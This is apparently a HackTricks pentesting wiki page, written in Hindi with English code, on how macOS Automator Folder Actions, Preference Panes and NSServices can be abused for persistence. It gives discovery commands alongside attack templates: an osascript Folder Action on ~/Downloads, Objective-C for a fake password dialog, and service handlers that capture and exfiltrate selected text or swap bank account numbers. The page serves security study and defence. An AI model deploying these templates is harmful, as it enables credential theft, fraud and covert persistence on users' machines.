# macOS Automator, Preference Panes & NSServices दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### मूल जानकारी

**Automator** macOS का दृश्य स्वचालन टूल है। यह **workflows** (`.workflow` bundles) चलाता है जो **actions** (`.action` bundles) से बने होते हैं। **Automator** Folder Actions, Quick Actions, और Shortcuts के एकीकरण को भी संचालित करता है।

Automator actions वो **plugins** हैं जो एक workflow के चलने पर Automator runtime में लोड होते हैं। वे कर सकते हैं:
- मनमाने shell scripts चलाना
- फ़ाइलों और डेटा को प्रोसेस करना
- AppleScript के जरिए applications के साथ इंटरैक्ट करना
- जटिल स्वचालन के लिए एक-दूसरे से श्रृंखला बनाकर काम करना

### यह महत्वपूर्ण क्यों है

> [!WARNING]
> Automator workflows को **social-engineered** करके निष्पादित कराया जा सकता है — वे साधारण दस्तावेज़ फ़ाइलों जैसा दिखते हैं। एक `.workflow` bundle में embedded shell commands हो सकते हैं जो workflow चलने पर निष्पादित हो जाते हैं। Folder Actions के साथ मिलकर, ये फ़ाइल इवेंट्स पर ट्रिगर होने वाली **automatic persistence** प्रदान करते हैं।

### खोज
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

एक `.workflow` बंडल अधिकांश उपयोगकर्ताओं को एक सामान्य दस्तावेज़ फ़ाइल के रूप में दिखता है:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions स्वचालित रूप से एक workflow निष्पादित करते हैं जब फ़ाइलें किसी निगरानी किए गए फ़ोल्डर में जोड़ी जाती हैं:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions रीबूट के बाद भी बने रहते हैं और चुपचाप चलते हैं। `~/Downloads` पर एक Folder Action का मतलब है कि **हर डाउनलोड की गई फ़ाइल आपकी payload को ट्रिगर करती है** — जिसमें Safari, Chrome, AirDrop, और ईमेल अटैचमेंट्स से मिली फ़ाइलें शामिल हैं।

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) ऐसे प्लगइन्स हैं जो **System Settings** (पूर्व में System Preferences) में लोड होते हैं। यह सिस्टम या थर्ड‑पार्टी फीचर्स के लिए कॉन्फ़िगरेशन UI पैनल प्रदान करते हैं।

### Why This Matters

- Preference panes **System Settings process** के भीतर चलते हैं, जिसमें संभवतः **elevated TCC permissions** हो सकते हैं (कुछ परिदृश्यों में accessibility, full disk access)
- थर्ड‑पार्टी preference panes इस भरोसेमंद प्रोसेस में लोड होते हैं और इसका सुरक्षा संदर्भ अपनाते हैं
- उपयोगकर्ता इन्हें डबल‑क्लिक करके इंस्टॉल करते हैं — आसान social engineering
- एक बार इंस्टॉल होने के बाद, वे स्थायी रूप से बने रहते हैं और हर बार जब System Settings उस पैनल को खोलता है तब लोड होते हैं

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

एक दुष्ट preference pane System Settings के सुरक्षा संदर्भ को विरासत में ले लेता है:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### हमला: Persistence via Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### हमला: UI Phishing

एक preference pane वैध सिस्टम UI पैनलों की नकल करके **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### बुनियादी जानकारी

**NSServices** एप्लिकेशनों को **Services menu** के माध्यम से अन्य ऐप्स को कार्यक्षमता प्रदान करने की अनुमति देते हैं (right-click → Services)। जब कोई उपयोगकर्ता टेक्स्ट या डेटा चुनता है और किसी service को सक्रिय करता है, तो चुना गया डेटा प्रोसेसिंग के लिए **सेवा प्रदाता को भेजा जाता है**।

Services को किसी application's `Info.plist` में `NSServices` key के अंतर्गत घोषित किया जाता है और pasteboard server (`pbs`) के साथ रजिस्टर किया जाता है।

### क्यों यह महत्वपूर्ण है

- Services को **cross-application data flow** मिलता है — किसी भी एप्लिकेशन से चुना गया टेक्स्ट service को भेजा जाता है
- एक दुर्भावनापूर्ण service पासवर्ड मैनेजर्स, ईमेल क्लाइंट्स, वित्तीय ऐप्स से डेटा कैप्चर कर सकता है
- Services कॉल करने वाली एप्लिकेशन को **संशोधित डेटा लौटाकर दे सकती हैं** (man-in-the-middle on selection operations)
- Service नाम वैध दिखने के लिए तैयार किए जा सकते हैं ("Format Text", "Encrypt Selection", "Share")

### खोज
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### हमला: डेटा इंटरसेप्शन सेवा
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### हमला: डेटा संशोधन (Man-in-the-Middle)

कोई सेवा वैध फ़ंक्शन प्रदान करने का आभास देते हुए **वापस किए गए डेटा को संशोधित** कर सकती है:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### प्रेफरेंस पैनल → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → पासवर्ड मैनेजर की चोरी
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## संदर्भ

* [Apple Developer — Automator Programming Guide](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane Programming Guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services Implementation Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
